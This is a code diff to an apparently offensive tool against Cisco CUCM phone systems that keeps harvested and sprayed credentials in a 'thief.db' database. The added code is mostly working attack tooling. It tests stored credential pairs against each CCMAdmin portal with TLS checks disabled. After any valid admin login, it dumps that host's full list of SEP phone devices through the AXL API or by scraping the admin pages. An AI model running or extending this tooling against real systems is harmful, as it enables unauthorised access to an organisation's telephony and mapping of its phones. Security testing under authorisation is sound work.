@@ -1254,6 +1254,27 @@ def log_uds_device(cucm_host, username, device_name, source, db_file='thief.db')
             print(f'[!] log_uds_device error: {e}')
 
 
+def log_admin_device(cucm_host, device_name, source, db_file='thief.db'):
+    """Insert a (cucm_host, device_name) row into admin_devices; ignores duplicates.
+
+    source is 'axl' or 'ccmadmin', recording how the name was retrieved.
+    """
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    try:
+        conn = sqlite3.connect(db_file, timeout=30.0)
+        conn.execute(
+            'INSERT OR IGNORE INTO admin_devices '
+            '(cucm_host, device_name, source, discovery_time) '
+            'VALUES (?, ?, ?, ?)',
+            (cucm_host, device_name, source, timestamp),
+        )
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        if globals().get('debug', False):
+            print(f'[!] log_admin_device error: {e}')
+
+
 def get_user_devices_unauthenticated(cucm_host, port=UDS_PORT, username='', timeout=10):
     """
     Probe /cucm-uds/user/{username} with no credentials.
@@ -1574,6 +1595,184 @@ def verify_ccmadmin_login(session, cucm_host, port, username, password, timeout=
     return ('error', code)
 
 
+# AXL schema version advertised in the SOAP namespace / SOAPAction header. AXL is
+# tolerant of minor version skew; 14.0 covers current CUCM releases and older
+# clusters answer it fine.
+AXL_VERSION = '14.0'
+
+# SEP device names are "SEP" + 12 hex (the MAC). Shared shape for both the AXL
+# and the CCMAdmin HTML extractors.
+_SEP_RE = re.compile(r'SEP[0-9A-Fa-f]{12}')
+
+
+def parse_axl_phone_names(xml_body):
+    """Return the ordered list of SEP device names from an AXL listPhone response.
+
+    Extracts <name>SEP...</name> values; non-SEP phones (CSF/TCT/etc.) are
+    ignored. Order is preserved; duplicates are not expected from AXL.
+    """
+    names = re.findall(r'<name>\s*(SEP[0-9A-Fa-f]{12})\s*</name>', xml_body)
+    return names
+
+
+def parse_ccmadmin_device_names(html_body):
+    """Return a sorted, de-duplicated list of SEP device names found in CCMAdmin
+    phone-find-list HTML. The list page renders each device name as link text;
+    we scrape every SEP token on the page and normalise/sort for stability."""
+    found = {m.group(0).upper() for m in _SEP_RE.finditer(html_body)}
+    return sorted(found)
+
+
+def get_admin_devices_axl(cucm_host, port, username, password, timeout=10, _post_fn=None):
+    """Fetch all SEP phone names via the AXL SOAP API (listPhone, name LIKE 'SEP%').
+
+    Returns the list of names on success, or None when AXL is unavailable to this
+    account (401/403), not present (404), returns a SOAP Fault, or errors out — so
+    the caller can fall back to scraping. Requires the account to hold the
+    'Standard AXL API Access' role.
+
+    _post_fn is injectable for testing (default: requests.post).
+    """
+    if _post_fn is None:
+        _post_fn = requests.post
+
+    url = f'https://{cucm_host}:{port}/axl/'
+    envelope = (
+        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" '
+        f'xmlns:ns="http://www.cisco.com/AXL/API/{AXL_VERSION}">'
+        '<soapenv:Header/><soapenv:Body>'
+        '<ns:listPhone><searchCriteria><name>SEP%</name></searchCriteria>'
+        '<returnedTags><name/></returnedTags>'
+        '</ns:listPhone></soapenv:Body></soapenv:Envelope>'
+    )
+    headers = {
+        'Content-Type': 'text/xml; charset=utf-8',
+        'SOAPAction': f'CUCM:DB ver={AXL_VERSION} listPhone',
+    }
+    try:
+        resp = _post_fn(
+            url,
+            data=envelope,
+            headers=headers,
+            auth=(username, password),
+            verify=False,
+            timeout=timeout,
+        )
+    except Exception as e:
+        dbg(f'get_admin_devices_axl {username}@{cucm_host} raised {type(e).__name__}: {e}')
+        return None
+
+    if resp.status_code != 200:
+        dbg(f'get_admin_devices_axl {cucm_host}: AXL returned HTTP {resp.status_code}')
+        return None
+    body = resp.text or ''
+    if 'Fault>' in body:
+        dbg(f'get_admin_devices_axl {cucm_host}: AXL SOAP Fault')
+        return None
+    if 'listPhoneResponse' not in body:
+        # A 200 that isn't a recognisable listPhone response (Tomcat interstitial,
+        # schema-version mismatch, etc.). Treat as "AXL unusable" so the caller
+        # falls back to scraping rather than trusting an empty parse.
+        dbg(f'get_admin_devices_axl {cucm_host}: unrecognised 200 body (no listPhoneResponse)')
+        return None
+    return parse_axl_phone_names(body)
+
+
+def get_admin_devices_scrape(cucm_host, port, username, password, timeout=10,
+                             _login_fn=None, _get_fn=None):
+    """Fallback device enumeration: log into CCMAdmin and scrape the phone
+    find-list page for SEP device names. Returns a list (possibly empty).
+
+    Used when AXL is unavailable to the account. Reuses verify_ccmadmin_login to
+    establish the Tomcat session, then pages through phoneFindList.do.
+
+    _login_fn / _get_fn are injectable for testing (defaults: verify_ccmadmin_login
+    and the session's bound GET).
+    """
+    if _login_fn is None:
+        _login_fn = verify_ccmadmin_login
+    session = requests.Session()
+    result, _code = _login_fn(session, cucm_host, port, username, password, timeout=timeout)
+    if result != 'valid':
+        dbg(f'get_admin_devices_scrape {cucm_host}: CCMAdmin login not valid ({result})')
+        return []
+
+    get_fn = _get_fn if _get_fn is not None else session.get
+    base = f'https://{cucm_host}:{port}/ccmadmin'
+    names = set()
+    rows_per_page = 250
+    for page in range(1, 41):  # hard cap: 40 pages * 250 = 10k devices
+        params = {
+            'lookup': 'true',
+            'multiple': 'true',
+            'rowsPerPage': str(rows_per_page),
+            'pattern': 'SEP',
+            'listSearchByParam': 'name',
+            'listSearchPattern': 'SEP%',
+            'page': str(page),
+        }
+        try:
+            resp = get_fn(
+                f'{base}/phoneFindList.do', params=params, verify=False, timeout=timeout
+            )
+        except Exception as e:
+            dbg(f'get_admin_devices_scrape {cucm_host} page {page} raised {type(e).__name__}: {e}')
+            break
+        if resp.status_code != 200:
+            # A 5xx, or an expired session re-served as a login redirect: the
+            # enumeration is cut short. Warn so the operator knows the device
+            # list may be partial rather than complete.
+            dbg(f'get_admin_devices_scrape {cucm_host} page {page}: HTTP {resp.status_code}, '
+                f'device list may be incomplete')
+            break
+        body = resp.text or ''
+        # Count raw SEP tokens (not the de-duplicated parse) for the short-page
+        # signal, since a name can render twice on one page (anchor + hidden input).
+        raw_count = len(_SEP_RE.findall(body))
+        new = set(parse_ccmadmin_device_names(body)) - names
+        if not new:
+            break  # no fresh devices on this page -> done paginating
+        names.update(new)
+        if raw_count < rows_per_page:
+            break  # short page -> last page
+    return sorted(names)
+
+
+def dump_admin_devices(cucm_host, port, username, password, db_file,
+                       timeout=10, _axl_fn=None, _scrape_fn=None):
+    """Enumerate all SEP device names for a host using valid admin credentials.
+
+    Tries AXL first (structured, needs the AXL role); falls back to scraping the
+    CCMAdmin phone list if AXL is unavailable. Persists each name to admin_devices
+    and returns the list. Never raises: on total failure it returns [].
+
+    _axl_fn / _scrape_fn are injectable for testing.
+    """
+    if _axl_fn is None:
+        _axl_fn = get_admin_devices_axl
+    if _scrape_fn is None:
+        _scrape_fn = get_admin_devices_scrape
+
+    names, source = [], None
+    try:
+        axl_names = _axl_fn(cucm_host, port, username, password, timeout=timeout)
+        if axl_names is not None:
+            names, source = axl_names, 'axl'
+        else:
+            names, source = _scrape_fn(cucm_host, port, username, password, timeout=timeout), 'ccmadmin'
+    except Exception as e:
+        dbg(f'dump_admin_devices {cucm_host} raised {type(e).__name__}: {e}')
+        return []
+
+    for name in names:
+        log_admin_device(cucm_host, name, source, db_file)
+    if names:
+        print(f'[+] {cucm_host}: {len(names)} SEP device(s) via {source}')
+    else:
+        print(f'[-] {cucm_host}: no SEP devices retrieved from the admin interface')
+    return names
+
+
 def _verify_worker(work_queue, results, port, db_file, timeout=10, _login_fn=None):
     """
     Thread target. Pops (cucm_host, username, password) tuples off work_queue,
@@ -1601,9 +1800,13 @@ def _verify_worker(work_queue, results, port, db_file, timeout=10, _login_fn=Non
 
         with results['lock']:
             results[result] += 1
+            if result == 'valid':
+                # Record the first valid credential pair per host so run_verify can
+                # dump that host's device list once (deduped by host).
+                results.setdefault('valid_logins', {}).setdefault(cucm_host, (username, password))
 
 
-def run_verify(hosts, pairs, port, threads, db_file):
+def run_verify(hosts, pairs, port, threads, db_file, dump_devices=True, _dump_fn=None):
     """
     Top-level orchestrator for --verify.
 
@@ -1611,8 +1814,13 @@ def run_verify(hosts, pairs, port, threads, db_file):
     tuples, skips combinations already definitively verified, runs a worker pool
     of CCMAdmin login attempts, and logs every attempt to verification_attempts.
 
+    When dump_devices is True, every host that produced a valid admin login this
+    run then has its full SEP device list pulled from the admin interface (AXL,
+    falling back to a CCMAdmin scrape) and persisted to admin_devices — once per
+    host, using the first valid credential pair found for it.
+
     Returns the results dict (valid/invalid/error/skipped counts) or None under
-    _TEST_MODE.
+    _TEST_MODE. _dump_fn is injectable for testing (default: dump_admin_devices).
     """
     if _TEST_MODE:
         return None
@@ -1638,7 +1846,8 @@ def run_verify(hosts, pairs, port, threads, db_file):
     print(f'[+] Verifying {len(pairs)} credential pair(s) against {len(hosts)} host(s): '
           f'{queued} attempt(s) queued, {skipped} already verified (skipped).')
 
-    results = {'valid': 0, 'invalid': 0, 'error': 0, 'skipped': skipped, 'lock': threading.Lock()}
+    results = {'valid': 0, 'invalid': 0, 'error': 0, 'skipped': skipped,
+               'valid_logins': {}, 'lock': threading.Lock()}
     if queued == 0:
         print('[+] Nothing to do; all combinations already verified.')
         return results
@@ -1657,6 +1866,15 @@ def run_verify(hosts, pairs, port, threads, db_file):
 
     print(f'[+] Verification complete: valid={results["valid"]} '
           f'invalid={results["invalid"]} error={results["error"]} skipped={skipped}')
+
+    valid_logins = results.get('valid_logins', {})
+    if dump_devices and valid_logins:
+        if _dump_fn is None:
+            _dump_fn = dump_admin_devices
+        print(f'[+] Dumping SEP device lists from {len(valid_logins)} host(s) with valid admin access...')
+        for host, (username, password) in valid_logins.items():
+            _dump_fn(host, port, username, password, db_file)
+
     return results
 
 
@@ -1994,6 +2212,19 @@ def init_database(db_file='thief.db'):
     cursor.execute('''
         CREATE INDEX IF NOT EXISTS idx_verification_attempts_host_user
             ON verification_attempts(cucm_host, username)
+    ''')
+
+    # Create table for SEP device names pulled from the CCMAdmin side (AXL or
+    # CCMAdmin phone-list scrape) after a valid admin login (--verify).
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS admin_devices (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            cucm_host TEXT NOT NULL,
+            device_name TEXT NOT NULL,
+            source TEXT NOT NULL,
+            discovery_time TEXT NOT NULL,
+            UNIQUE(cucm_host, device_name)
+        )
     ''')
 
     conn.commit()
@@ -2416,6 +2647,29 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
             else:
                 raise
 
+        # Get admin-sourced devices (AXL or CCMAdmin scrape after --verify)
+        admin_devices = []
+        try:
+            if cucm_filter:
+                cursor.execute('''
+                    SELECT cucm_host, device_name, source, discovery_time
+                      FROM admin_devices
+                     WHERE cucm_host = ?
+                     ORDER BY device_name
+                ''', (cucm_filter,))
+            else:
+                cursor.execute('''
+                    SELECT cucm_host, device_name, source, discovery_time
+                      FROM admin_devices
+                     ORDER BY cucm_host, device_name
+                ''')
+            admin_devices = cursor.fetchall()
+        except sqlite3.OperationalError as e:
+            if 'no such table' in str(e):
+                admin_devices = []
+            else:
+                raise
+
         uds_directory = []
         try:
             if cucm_filter:
@@ -2465,7 +2719,7 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
 
         conn.close()
         
-        if not credentials and not usernames and not mac_prefixes and not phone_cucm and not cluster_servers and not spray_hits and not uds_devices and not uds_directory and not verified_admins:
+        if not credentials and not usernames and not mac_prefixes and not phone_cucm and not cluster_servers and not spray_hits and not uds_devices and not uds_directory and not verified_admins and not admin_devices:
             print(f'\n[-] No data found in database')
             if cucm_filter:
                 print(f'[-] Filter: CUCM host = {cucm_filter}')
@@ -2585,6 +2839,14 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
             print("-"*70)
             for cucm_host_row, username, device_name, source, ts in uds_devices:
                 print(f'{username:<24} {device_name:<20} {source:<12} {cucm_host_row}')
+
+        if admin_devices:
+            print(f'\n\033[1m[+] Admin Devices ({len(admin_devices)} total)\033[0m')
+            print("-"*70)
+            print(f'{"Device":<20} {"Source":<12} {"CUCM Host"}')
+            print("-"*70)
+            for cucm_host_row, device_name, source, ts in admin_devices:
+                print(f'{device_name:<20} {source:<12} {cucm_host_row}')
 
         if uds_directory:
             print(f'\n\033[1m[+] UDS Directory ({len(uds_directory)} total)\033[0m')
@@ -2858,11 +3120,13 @@ def main():
     parser.add_argument('--no-spray-probe', action='store_true', default=False,
                         help='Skip the pre-flight oracle probe (use only after manual verification)')
     parser.add_argument('--verify', action='store_true', default=False,
-                        help='Verify stored credential pairs against each known CUCM CCMAdmin portal (requires the database)')
+                        help='Verify stored credential pairs against each known CUCM CCMAdmin portal, then dump the SEP device list from any host with valid admin access (requires the database; see --no-device-dump)')
     parser.add_argument('--verify-port', type=int, default=8443,
                         help='CCMAdmin HTTPS port for --verify (default: 8443; some clusters use 443)')
     parser.add_argument('--verify-threads', type=int, default=10,
                         help='Concurrent verification workers (default: 10)')
+    parser.add_argument('--no-device-dump', action='store_true', default=False,
+                        help='With --verify, skip pulling the SEP device list (AXL/CCMAdmin) from hosts with valid admin access')
 
     # Output Options
     parser.add_argument('--csv', type=str, metavar='FILENAME', help='Export discovered credentials to CSV file')
@@ -3053,6 +3317,7 @@ def main():
             port=args.verify_port,
             threads=args.verify_threads,
             db_file=db_file,
+            dump_devices=not args.no_device_dump,
         )
         quit(0)
 
